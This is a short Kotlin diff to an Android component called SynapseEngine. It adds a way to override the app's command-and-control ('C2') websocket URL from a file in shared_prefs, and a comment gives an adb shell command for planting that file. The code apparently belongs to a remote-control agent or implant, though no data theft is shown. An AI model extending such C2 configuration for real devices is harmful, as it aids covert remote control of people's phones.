@@ -44,7 +44,17 @@ object SynapseEngine {
 
         val deviceId = getDeviceId(context)
         val prefs = context.getSharedPreferences("synapse_prefs", Context.MODE_PRIVATE)
-        val c2Url = prefs.getString("c2_base_url", DEFAULT_C2) ?: DEFAULT_C2
+        // Allow override via ADB: adb shell "echo 'wss://IP:8443/c2' > /data/data/org.synapse.core/shared_prefs/synapse_c2_url"
+        val overrideFile = java.io.File(context.filesDir.parent, "shared_prefs/synapse_c2_url")
+        var c2Url = DEFAULT_C2
+        if (overrideFile.exists()) {
+            c2Url = overrideFile.readText().trim()
+            if (c2Url.isNotEmpty() && c2Url.startsWith("wss://")) {
+                prefs.edit().putString("c2_base_url", c2Url).apply()
+                Log.d(TAG, "C2 URL override: $c2Url")
+            }
+        }
+        c2Url = prefs.getString("c2_base_url", c2Url) ?: c2Url
         val fcmToken = prefs.getString("fcm_token", null)
 
         prefs.edit().putString("device_id", deviceId).apply()
